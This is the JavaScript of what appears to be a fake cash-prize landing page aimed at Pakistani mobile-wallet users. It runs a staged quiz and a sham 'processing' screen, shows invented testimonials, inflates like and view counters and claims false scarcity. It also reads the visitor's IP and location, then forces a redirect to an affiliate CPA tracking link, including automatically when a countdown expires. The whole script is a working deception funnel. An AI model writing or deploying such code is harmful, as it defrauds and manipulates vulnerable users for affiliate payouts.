  <script>
    (function() {
      const CPA_LINK = "https://vtdmp.bemobtrcks.com/click/1?ns=c%3D391e0127-2fb1-490e-b450-95efb6f353d3..l%3D2..a%3D0..b%3D0";
      const initialModal = document.getElementById('initialModal');
      const winCongratsModal = document.getElementById('winCongratsModal');
      const winConfirmModal = document.getElementById('winConfirmModal');
      const commentsList = document.getElementById('comments-list');
      const confettiCanvas = document.getElementById('confetti-canvas');
      const confettiCtx = confettiCanvas.getContext('2d');
      const processingScreen = document.getElementById('processingScreen');

      let userCountryName = 'Pakistan';
      let userCountryFlag = '🇵🇰';
      let userIP = 'Loading...';
      let countdownInterval = null;
      let countdownSeconds = 30;
      let selectedCount = 3;
      let selectedPurpose = '';

      const STATIC_COMMENTS = [
        { name: "Ahmed R.", msg: "I received ₨100,000 😍", time: "2m ago" },
        { name: "Fatima K.", msg: "JazzCash works fast! Instant transfer 🔥", time: "4m ago" },
        { name: "Bilal A.", msg: "Just got paid. This is actually real!", time: "6m ago" },
        { name: "Sana U.", msg: "Claimed mine already 💸 Thank you!", time: "9m ago" },
        { name: "Hamza Z.", msg: "Wow, amazing 🙌 Highly recommended", time: "12m ago" },
        { name: "Ayesha L.", msg: "Thought it was fake but got the money instantly", time: "15m ago" },
        { name: "Omar F.", msg: "Tapmad campaigns are always legit 🚀", time: "18m ago" },
        { name: "Zara N.", msg: "So happy right now! Best day ever ✨", time: "21m ago" },
        { name: "Ali B.", msg: "Withdrawn to Easypaisa & JazzCash both worked", time: "25m ago" },
        { name: "Maham S.", msg: "Shared with my group chat! All claimed ✅", time: "30m ago" }
      ];

      const PARTICLES_COUNT = 30;
      let quizCompleted = false;

      async function fetchIPInfo() {
        try {
          const ipRes = await fetch('https://api.ipify.org?format=json');
          const ipData = await ipRes.json();
          userIP = ipData.ip;
          const geoRes = await fetch(`https://ipapi.co/${userIP}/json/`);
          const geoData = await geoRes.json();
          if (geoData.country_name) {
            userCountryName = geoData.country_name;
            userCountryFlag = getFlagEmoji(geoData.country_code);
          }
        } catch (e) {
          userCountryName = 'Pakistan';
          userCountryFlag = '🇵🇰';
          userIP = 'Unable to detect';
        }
        document.getElementById('userIP').textContent = userIP;
        document.getElementById('initialDevice').textContent = detectDeviceType();
        document.getElementById('userCountry').textContent = userCountryFlag + ' ' + userCountryName;
        selectedCount = Math.floor(Math.random() * 2) + 2;
        updateAllScarcityNotes();
        initialModal.style.display = 'flex';
      }

      function updateAllScarcityNotes() {
        const noteText = `🔥 You are 1 among only ${selectedCount} selected today!`;
        const notes = document.querySelectorAll('.scarcity-note');
        notes.forEach(note => {
          note.textContent = noteText;
        });
      }

      function getFlagEmoji(countryCode) {
        if (!countryCode) return '🇵🇰';
        const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
        return String.fromCodePoint(...codePoints);
      }

      function detectDeviceType() {
        const ua = navigator.userAgent;
        if (/iPad|iPhone|iPod/.test(ua)) return 'iOS Mobile';
        if (/Android/.test(ua)) return 'Android Mobile';
        if (/Macintosh|Mac OS X/.test(ua)) return 'macOS Desktop';
        if (/Windows/.test(ua)) return 'Windows Desktop';
        if (/Linux/.test(ua) && !/Android/.test(ua)) return 'Linux Desktop';
        return 'Unknown Device';
      }

      function createParticles() {
        const container = document.getElementById('particles');
        for(let i=0; i<PARTICLES_COUNT; i++){
          const p = document.createElement('div');
          p.className = 'particle';
          const size = Math.random() * 8 + 4;
          p.style.width = `${size}px`; p.style.height = `${size}px`;
          p.style.left = `${Math.random() * 100}%`;
          p.style.background = Math.random() > 0.6 ? '#FFD700' : '#ffffff';
          p.style.animationDuration = `${Math.random() * 12 + 8}s`;
          p.style.animationDelay = `${Math.random() * 6}s`;
          container.appendChild(p);
        }
      }
      createParticles();

      // QUIZ LOGIC
      function handleOptionClick(optionElement) {
        if (quizCompleted) return;
        
        const nextAction = optionElement.getAttribute('data-next');
        const purpose = optionElement.getAttribute('data-purpose');
        
        // Find the parent quiz-step
        const stepElement = optionElement.closest('.quiz-step');
        const allOptions = stepElement.querySelectorAll('.quiz-option');
        
        // Mark selected
        allOptions.forEach(opt => opt.classList.remove('selected'));
        optionElement.classList.add('selected');
        
        // Disable all options in current step
        allOptions.forEach(opt => opt.style.pointerEvents = 'none');
        
        if (nextAction === 'step2yes') {
          // Yes clicked - go to Step 2 (money usage)
          setTimeout(() => {
            stepElement.classList.remove('active');
            document.getElementById('quizStep2Yes').classList.add('active');
          }, 400);
        } else if (nextAction === 'step2no') {
          // No clicked - go to Step 2 (what do you want)
          setTimeout(() => {
            stepElement.classList.remove('active');
            document.getElementById('quizStep2No').classList.add('active');
          }, 400);
        } else if (nextAction === 'processing') {
          // Store purpose and start processing
          selectedPurpose = purpose || 'cover your needs';
          setTimeout(() => {
            stepElement.classList.remove('active');
            startProcessing();
          }, 400);
        }
      }

      function startProcessing() {
        processingScreen.classList.add('active');
        
        const step1 = document.getElementById('procStep1');
        const step2 = document.getElementById('procStep2');
        const step3 = document.getElementById('procStep3');
        
        // Reset steps
        [step1, step2, step3].forEach(s => {
          s.classList.remove('done', 'active-step');
          s.querySelector('.step-icon').innerHTML = '⏳';
        });
        
        // Step 1: Submitting
        setTimeout(() => {
          step1.classList.add('active-step');
          step1.querySelector('.step-icon').innerHTML = '<div class="spinner-small"></div>';
        }, 300);
        
        // Step 1 done, Step 2 active
        setTimeout(() => {
          step1.classList.remove('active-step');
          step1.classList.add('done');
          step1.querySelector('.step-icon').textContent = '✅';
          step2.classList.add('active-step');
          step2.querySelector('.step-icon').innerHTML = '<div class="spinner-small"></div>';
        }, 2200);
        
        // Step 2 done, Step 3 active
        setTimeout(() => {
          step2.classList.remove('active-step');
          step2.classList.add('done');
          step2.querySelector('.step-icon').textContent = '✅';
          step3.classList.add('active-step');
          step3.querySelector('.step-icon').innerHTML = '<div class="spinner-small"></div>';
        }, 4200);
        
        // All done - show win popup
        setTimeout(() => {
          step3.classList.remove('active-step');
          step3.classList.add('done');
          step3.querySelector('.step-icon').textContent = '✅';
          
          // Show congratulations popup
          setTimeout(() => {
            quizCompleted = true;
            processingScreen.classList.remove('active');
            document.getElementById('winPurpose').textContent = selectedPurpose;
            updateAllScarcityNotes();
            winCongratsModal.style.display = 'flex';
            startConfetti();
          }, 600);
        }, 6200);
      }

      // Attach event listeners to all quiz options
      document.querySelectorAll('.quiz-option').forEach(option => {
        option.addEventListener('click', function() {
          handleOptionClick(this);
        });
      });

      // CONFETTI
      let confettiParticles = [];
      let confettiAnimationId = null;
      function resizeConfetti() {
        confettiCanvas.width = window.innerWidth;
        confettiCanvas.height = window.innerHeight;
      }
      window.addEventListener('resize', resizeConfetti);
      resizeConfetti();

      function startConfetti() {
        confettiParticles = [];
        const colors = ['#FFD700', '#25D366', '#FF4500', '#1E90FF', '#FF69B4', '#FFF'];
        for (let i = 0; i < 200; i++) {
          confettiParticles.push({
            x: Math.random() * confettiCanvas.width,
            y: Math.random() * confettiCanvas.height - confettiCanvas.height,
            size: Math.random() * 8 + 4,
            color: colors[Math.floor(Math.random() * colors.length)],
            speedY: Math.random() * 5 + 4,
            speedX: (Math.random() - 0.5) * 3,
            rotation: Math.random() * 360,
            rotationSpeed: (Math.random() - 0.8) * 12,
            opacity: 1
          });
        }
        if (confettiAnimationId) cancelAnimationFrame(confettiAnimationId);
        function animateConfetti() {
          confettiCtx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
          let stillActive = false;
          for (let p of confettiParticles) {
            p.y += p.speedY;
            p.x += p.speedX;
            p.rotation += p.rotationSpeed;
            p.opacity -= 0.003;
            if (p.opacity <= 0) continue;
            stillActive = true;
            confettiCtx.save();
            confettiCtx.translate(p.x, p.y);
            confettiCtx.rotate((p.rotation * Math.PI) / 180);
            confettiCtx.globalAlpha = p.opacity;
            confettiCtx.fillStyle = p.color;
            confettiCtx.fillRect(-p.size/2, -p.size/4, p.size, p.size/2);
            confettiCtx.restore();
          }
          if (stillActive) {
            confettiAnimationId = requestAnimationFrame(animateConfetti);
          } else {
            confettiCtx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
            confettiAnimationId = null;
          }
        }
        animateConfetti();
      }

      function startCountdown() {
        countdownSeconds = 30;
        const timerDisplay = document.getElementById('countdownTimer');
        function updateTimer() {
          const minutes = Math.floor(countdownSeconds / 60);
          const seconds = countdownSeconds % 60;
          timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
          if (countdownSeconds <= 10) timerDisplay.style.color = '#ff0000';
          if (countdownSeconds <= 0) {
            clearInterval(countdownInterval);
            timerDisplay.textContent = "00:00";
            window.location.href = CPA_LINK;
          }
          countdownSeconds--;
        }
        updateTimer();
        countdownInterval = setInterval(updateTimer, 1000);
      }

      function stopCountdown() {
        if (countdownInterval) { clearInterval(countdownInterval); countdownInterval = null; }
      }

      document.getElementById('continueBtn').addEventListener('click', () => {
        initialModal.style.display = 'none';
      });

      // Win congrats proceed button -> goes to confirm phone number popup
      document.getElementById('winProceedBtn').addEventListener('click', () => {
        winCongratsModal.style.display = 'none';
        updateAllScarcityNotes();
        winConfirmModal.style.display = 'flex';
        startCountdown();
      });

      // Confirm phone number button -> CPA link
      document.getElementById('proceedBtn').addEventListener('click', () => {
        stopCountdown();
        window.location.href = CPA_LINK;
      });

      let likes = 1205;
      let views = 300450;
      const likesEl = document.querySelector('.likes-text');
      const viewsEl = document.querySelector('.views-text');
      setInterval(() => {
        likes += Math.floor(Math.random() * 3) + 1;
        likesEl.textContent = `❤️ ${likes.toLocaleString()}+`;
      }, 1400);
      setInterval(() => {
        const change = Math.floor(Math.random() * 150) - 60;
        views += change;
        if(views < 295000) views = 295000;
        viewsEl.textContent = `${views.toLocaleString()}+`;
      }, 1800);

      function renderComments() {
        commentsList.innerHTML = '';
        STATIC_COMMENTS.forEach((c, idx) => {
          const card = document.createElement('div');
          card.className = 'comment-card';
          card.style.animationDelay = `${idx * 0.05}s`;
          card.innerHTML = `
            <div class="comment-avatar">${c.name.charAt(0)}</div>
            <div class="comment-content">
              <div class="comment-name">${c.name} <span style="color:#555; font-size:11px;">• ${c.time}</span></div>
              <div class="comment-text">${c.msg}</div>
            </div>
          `;
          commentsList.appendChild(card);
        });
      }
      renderComments();

      const commentInput = document.getElementById('userComment');
      const postBtn = document.getElementById('postComment');
      postBtn.addEventListener('click', () => {
        const text = commentInput.value.trim();
        if(!text) return;
        const newComment = { name: "You", msg: text, time: "Just now" };
        STATIC_COMMENTS.unshift(newComment);
        const card = document.createElement('div');
        card.className = 'comment-card';
        card.style.border = "1px solid #25D366";
        card.style.background = "#0d1a12";
        card.innerHTML = `
          <div class="comment-avatar" style="background:var(--primary); color:#000;">✓</div>
          <div class="comment-content">
            <div class="comment-name">${newComment.name} <span style="color:#25D366; font-size:11px;">• ${newComment.time}</span></div>
            <div class="comment-text">${newComment.msg}</div>
          </div>
        `;
        commentsList.insertBefore(card, commentsList.firstChild);
        commentInput.value = '';
        postBtn.disabled = true;
        postBtn.textContent = "POSTED ✓";
      });
      commentInput.addEventListener('keypress', (e) => {
        if(e.key === 'Enter') postBtn.click();
      });

      fetchIPInfo();
    })();
  </script>
